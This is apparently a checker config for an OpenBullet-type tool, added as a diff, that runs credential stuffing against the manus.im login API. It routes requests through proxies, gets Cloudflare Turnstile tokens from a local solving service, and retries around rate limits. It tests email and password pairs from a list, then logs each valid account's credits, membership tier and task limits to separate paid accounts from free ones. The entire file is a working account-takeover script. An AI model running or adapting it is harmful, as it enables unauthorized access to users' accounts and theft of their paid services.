@@ -1,0 +1,240 @@
+BLOCK:SolveCloudflareTurnstileCaptcha
+DISABLED
+LABEL:ENABLE IF YOU WANT TO USE PAID CAPTCHA SERVICE
+  siteKey = "0x4AAAAAAA_sd0eRNCinWBgU"
+  siteUrl = "https%3A%2F%2Fmanus.im%2F"
+  => VAR @yeat
+ENDBLOCK
+
+string _ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36";
+data.LogVariableAssignment(nameof(_ua));
+
+data.UseProxy = false;
+
+BLOCK:HttpRequest
+LABEL:ts
+  url = "http://127.0.0.1:6767/solve?url=https%3A%2F%2Fmanus.im%2F&sitekey=0x4AAAAAAA_sd0eRNCinWBgU"
+  httpLibrary = SystemNet
+  timeoutMilliseconds = 90000
+  TYPE:STANDARD
+  ""
+  ""
+ENDBLOCK
+
+data.UseProxy = true;
+
+BLOCK:Keycheck
+LABEL:kts
+  banIfNoMatch = False
+  KEYCHAIN RETRY OR
+    STRINGKEY @data.SOURCE Contains "\"success\":false"
+    STRINGKEY @data.SOURCE Contains "\"success\": false"
+    STRINGKEY @data.RESPONSECODE DoesNotContain "200"
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:pts
+  input = @data.SOURCE
+  leftDelim = "\"token\":\""
+  rightDelim = "\""
+  MODE:LR
+  => VAR @_q1
+ENDBLOCK
+
+BLOCK:Keycheck
+LABEL:kts2
+  banIfNoMatch = False
+  KEYCHAIN RETRY OR
+    STRINGKEY @_q1 EqualTo ""
+ENDBLOCK
+
+BLOCK:HttpRequest
+LABEL:r1
+  url = "https://api.manus.im/user.v1.UserAuthPublicService/GetUserPlatforms"
+  method = POST
+  httpLibrary = SystemNet
+  securityProtocol = TLS12
+  customHeaders = ${("User-Agent", "<_ua>"), ("Accept", "*/*"), ("Accept-Language", "en-GB,en-US;q=0.9,en;q=0.8"), ("Accept-Encoding", "gzip, deflate"), ("Referer", "https://manus.im/"), ("Connect-Protocol-Version", "1"), ("X-Client-Id", "oOyiiFQN6teedeGBWvq6ec"), ("X-Client-Locale", "en-GB"), ("X-Client-Timezone", "Europe/London"), ("X-Client-Timezone-Offset", "0"), ("X-Client-Type", "web"), ("Origin", "https://manus.im"), ("Sec-Fetch-Dest", "empty"), ("Sec-Fetch-Mode", "cors"), ("Sec-Fetch-Site", "same-site"), ("Te", "trailers"), ("Priority", "u=0")}
+  TYPE:STANDARD
+  $"{\"email\":\"<input.USER>\",\"cfCaptchaCode\":\"<_q1>\"}"
+  "application/json"
+ENDBLOCK
+
+BLOCK:Keycheck
+LABEL:k1
+  banIfNoMatch = False
+  KEYCHAIN RETRY OR
+    STRINGKEY @data.RESPONSECODE EqualTo "403"
+    STRINGKEY @data.RESPONSECODE EqualTo "429"
+    STRINGKEY @data.SOURCE Contains "captcha"
+    STRINGKEY @data.SOURCE Contains "too many"
+    STRINGKEY @data.SOURCE Contains "rate limit"
+  KEYCHAIN FAIL OR
+    STRINGKEY @data.RESPONSECODE EqualTo "400"
+    STRINGKEY @data.RESPONSECODE EqualTo "401"
+    STRINGKEY @data.RESPONSECODE EqualTo "404"
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:p2
+  input = @data.SOURCE
+  leftDelim = "\"tempToken\":\""
+  rightDelim = "\""
+  MODE:LR
+  => VAR @_q2
+ENDBLOCK
+
+BLOCK:Keycheck
+LABEL:k_q2
+  banIfNoMatch = False
+  KEYCHAIN RETRY OR
+    STRINGKEY @_q2 EqualTo ""
+ENDBLOCK
+
+BLOCK:HttpRequest
+LABEL:r2
+  url = "https://api.manus.im/user.v1.UserAuthPublicService/LoginByEmail"
+  method = POST
+  httpLibrary = SystemNet
+  securityProtocol = TLS12
+  customHeaders = ${("User-Agent", "<_ua>"), ("Accept", "*/*"), ("Accept-Language", "en-GB,en-US;q=0.9,en;q=0.8"), ("Accept-Encoding", "gzip, deflate"), ("Referer", "https://manus.im/"), ("Connect-Protocol-Version", "1"), ("X-Client-Id", "oOyiiFQN6teedeGBWvq6ec"), ("X-Client-Locale", "en-GB"), ("X-Client-Timezone", "Europe/London"), ("X-Client-Timezone-Offset", "0"), ("X-Client-Type", "web"), ("X-Client-Dcr", "hbM4BVL9Ln4yhpoveJHyQV7zLFkAdZ8ne6gcLH8XLGHzOmD0LIgsemB3RbE7QmT0LKM5RmH3QV7zNVEKCZQueb1bPGHzPGHzPVEJdAMoCp27OcH3QV7zLlzleJ2mBZaoLmrlCZ7lOFMvBZ8qgZIqCAPlRovlCZ7wYYPlOFMoelMgOFM3dZ4ohp2xCVL9LnIcdZHyUJkkd5HlOFMpC4MofAYof6UMCFL9LlLvLpQmfpYoelL9hbM6dZU3dFL9PmX5PFzldJYsC5k3LmraQGTziVzlgpoog6EyfqTlRqvlg5ongJjlRmL4QmDvLpkodZgrgFL9PWPzQ63vLqUseZYcgJIwfFL9PWf5QGH4RGn7QcDzRFzlgJowCAsyepYSCpCcCATlRl3cQmE2"), ("Origin", "https://manus.im"), ("Sec-Fetch-Dest", "empty"), ("Sec-Fetch-Mode", "cors"), ("Sec-Fetch-Site", "same-site"), ("Te", "trailers"), ("Priority", "u=0")}
+  TYPE:STANDARD
+  $"{\"email\":\"<input.USER>\",\"password\":\"<input.PASS>\",\"token\":\"<_q2>\"}"
+  "application/json"
+ENDBLOCK
+
+BLOCK:Keycheck
+LABEL:k2
+  banIfNoMatch = False
+  KEYCHAIN RETRY OR
+    STRINGKEY @data.RESPONSECODE EqualTo "403"
+    STRINGKEY @data.RESPONSECODE EqualTo "429"
+    STRINGKEY @data.SOURCE Contains "captcha"
+    STRINGKEY @data.SOURCE Contains "too many"
+    STRINGKEY @data.SOURCE Contains "rate limit"
+  KEYCHAIN FAIL OR
+    STRINGKEY @data.SOURCE Contains "ErrorDetail"
+    STRINGKEY @data.SOURCE Contains "Password does not match"
+    STRINGKEY @data.SOURCE Contains "\"message\":\"Error\""
+    STRINGKEY @data.RESPONSECODE EqualTo "400"
+    STRINGKEY @data.RESPONSECODE EqualTo "401"
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:p3
+  input = @data.SOURCE
+  leftDelim = "\"token\":\""
+  rightDelim = "\""
+  MODE:LR
+  => VAR @_q3
+ENDBLOCK
+
+BLOCK:Keycheck
+LABEL:k_q3
+  banIfNoMatch = False
+  KEYCHAIN FAIL OR
+    STRINGKEY @_q3 EqualTo ""
+ENDBLOCK
+
+BLOCK:HttpRequest
+LABEL:r3
+  url = "https://api.manus.im/user.v1.UserService/GetAvailableCredits"
+  method = POST
+  httpLibrary = SystemNet
+  securityProtocol = TLS12
+  customHeaders = ${("User-Agent", "<_ua>"), ("Accept", "*/*"), ("Accept-Language", "en-GB,en-US;q=0.9,en;q=0.8"), ("Accept-Encoding", "gzip, deflate"), ("Referer", "https://manus.im/"), ("Connect-Protocol-Version", "1"), ("Authorization", "Bearer <_q3>"), ("X-Client-Id", "oOyiiFQN6teedeGBWvq6ec"), ("X-Client-Locale", "en-GB"), ("X-Client-Timezone", "Europe/London"), ("X-Client-Timezone-Offset", "0"), ("X-Client-Type", "web"), ("Origin", "https://manus.im"), ("Sec-Fetch-Dest", "empty"), ("Sec-Fetch-Mode", "cors"), ("Sec-Fetch-Site", "same-site"), ("Te", "trailers"), ("Priority", "u=4")}
+  TYPE:STANDARD
+  "{}"
+  "application/json"
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:p_credits
+  input = @data.SOURCE
+  leftDelim = "\"totalCredits\":"
+  rightDelim = ","
+  MODE:LR
+  => VAR @_q4
+ENDBLOCK
+
+BLOCK:Keycheck
+LABEL:k3
+  banIfNoMatch = False
+  KEYCHAIN DEAD OR
+    STRINGKEY @data.RESPONSECODE EqualTo "403"
+  KEYCHAIN RETRY OR
+    STRINGKEY @data.RESPONSECODE EqualTo "429"
+    STRINGKEY @data.RESPONSECODE EqualTo "500"
+    STRINGKEY @data.RESPONSECODE EqualTo "502"
+  KEYCHAIN FAIL OR
+    STRINGKEY @data.RESPONSECODE EqualTo "401"
+ENDBLOCK
+
+BLOCK:HttpRequest
+LABEL:r4
+  url = "https://api.manus.im/user.v1.UserService/UserInfo"
+  method = POST
+  httpLibrary = SystemNet
+  securityProtocol = TLS12
+  customHeaders = ${("User-Agent", "<_ua>"), ("Accept", "*/*"), ("Accept-Language", "en-GB,en-US;q=0.9,en;q=0.8"), ("Accept-Encoding", "gzip, deflate"), ("Referer", "https://manus.im/"), ("Connect-Protocol-Version", "1"), ("Authorization", "Bearer <_q3>"), ("X-Client-Id", "oOyiiFQN6teedeGBWvq6ec"), ("X-Client-Locale", "en-GB"), ("X-Client-Timezone", "Europe/London"), ("X-Client-Timezone-Offset", "0"), ("X-Client-Type", "web"), ("Origin", "https://manus.im"), ("Sec-Fetch-Dest", "empty"), ("Sec-Fetch-Mode", "cors"), ("Sec-Fetch-Site", "same-site"), ("Te", "trailers"), ("Priority", "u=4")}
+  TYPE:STANDARD
+  "{}"
+  "application/json"
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:p_membership
+  input = @data.SOURCE
+  leftDelim = "\"membershipVersion\":\""
+  rightDelim = "\""
+  MODE:LR
+  => VAR @_q5
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:p_usertype
+  input = @data.SOURCE
+  leftDelim = "\"userType\":\""
+  rightDelim = "\""
+  MODE:LR
+  => VAR @_q6
+ENDBLOCK
+
+BLOCK:Parse
+LABEL:p_tasklimit
+  input = @data.SOURCE
+  leftDelim = "\"concurrentScheduleTaskLimit\":"
+  rightDelim = ","
+  MODE:LR
+  => VAR @_q7
+ENDBLOCK
+
+BLOCK:Keycheck
+LABEL:k4
+  banIfNoMatch = False
+  KEYCHAIN DEAD OR
+    STRINGKEY @data.RESPONSECODE EqualTo "403"
+  KEYCHAIN SUCCESS OR
+    STRINGKEY @_q5 DoesNotContain "free"
+    STRINGKEY @_q6 DoesNotContain "free"
+    STRINGKEY @_q5 DoesNotContain "0"
+  KEYCHAIN CUSTOM OR
+    STRINGKEY @_q5 Contains "free"
+    STRINGKEY @_q6 Contains "free"
+    STRINGKEY @_q5 Contains "0"
+  KEYCHAIN FAIL OR
+    STRINGKEY @data.RESPONSECODE EqualTo "400"
+    STRINGKEY @data.RESPONSECODE EqualTo "401"
+ENDBLOCK
+
+BLOCK:ConstantString
+LABEL:out1
+  value = $"Credits: <_q4> | Membership: <_q5> | UserType: <_q6> | TaskLimits: <_q7>"
+  => CAP @info
+ENDBLOCK
+
+BLOCK:ConstantString
+LABEL:out2
+  value = "@YeatTheLegit"
+  => CAP @by
+ENDBLOCK
